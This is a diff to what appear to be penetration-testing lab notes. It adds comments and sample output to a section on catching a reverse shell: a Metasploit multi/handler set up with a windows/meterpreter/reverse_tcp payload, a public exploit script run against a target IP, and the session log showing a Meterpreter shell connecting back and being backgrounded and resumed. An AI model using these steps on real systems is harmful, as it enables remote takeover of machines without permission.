@@ -117,7 +117,7 @@ Using the public exploit you found + Metasploit Multi-Handler, you can establish
 
 Metasploit Handler usage w/ public exploit:
 ```bash
-# Set up Metasploit Handler
+# Set up Metasploit Handler (use multi-handler -> set reverse shell payload -> set variables -> run handler)
 $ msfconsole
 $ msf > use exploit/multi/handler
 $ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
@@ -130,11 +130,16 @@ $ msf exploit(handler) > run
 # Execute Public Exploit:
 $ python exploit.py [ target_ip ]
 
-# Metasploit Handler
+# Metasploit Handler (meterpreter session -> background the session -> connect back to session)
 [*] Exploit running as background job 0.
 [*] Started reverse TCP handler on 10.11.0.31:443 
 [*] Sending stage (179267 bytes) to 10.11.1.5
 [*] Meterpreter session 0 opened (10.11.0.31:443 -> 10.11.1.5:1199) at 2019-01-07 22:46:33 +1100
+meterpreter > help
+. . . 
+meterpreter > background
+msf exploit(ms08_067_netapi) > sessions -i 0
+[*] Starting interaction with 0...
 meterpreter >
 ```
 
